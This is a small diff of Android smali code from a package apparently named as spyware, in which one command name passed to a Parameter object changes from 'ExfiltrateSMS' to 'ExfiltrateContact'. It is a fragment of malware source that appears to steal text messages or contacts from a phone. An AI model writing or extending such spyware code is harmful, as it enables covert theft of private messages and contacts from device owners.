@@ -240,7 +240,7 @@
     :cond_4e
     new-instance v4, Landroid/spyware/utils/Parameter;
 
-    const-string v6, "ExfiltrateSMS"
+    const-string v6, "ExfiltrateContact"
 
     invoke-direct {v4, v6, v0}, Landroid/spyware/utils/Parameter;-><init>(Ljava/lang/String;Lorg/json/JSONArray;)V
 
